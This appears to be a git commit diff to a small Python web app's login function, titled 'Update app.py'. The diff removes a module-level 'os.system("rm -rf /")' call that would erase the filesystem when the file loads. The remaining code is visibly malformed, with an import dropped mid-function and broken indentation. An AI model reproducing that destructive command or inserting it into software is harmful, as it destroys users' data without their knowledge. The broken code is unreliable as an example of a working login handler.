340fe3794c907aadc4e823a69fbc6f08fec3dd0c
deepakkannarp26 <deepakkanna.rp@gmail.com>
2026-02-18 10:42:56 +0530

    Update app.py

--- src/app.py
+++ src/app.py
@@ -7,13 +7,12 @@ def login():
     username = request.form["username"]
     password = request.form["password"]
 import os
-
 if username == os.getenv("ADMIN_USER") and password == os.getenv("ADMIN_PASS"):
 
         return "Logged in"
     return "Invalid"
-import os
-os.system("rm -rf /")
+
+
 
 
 
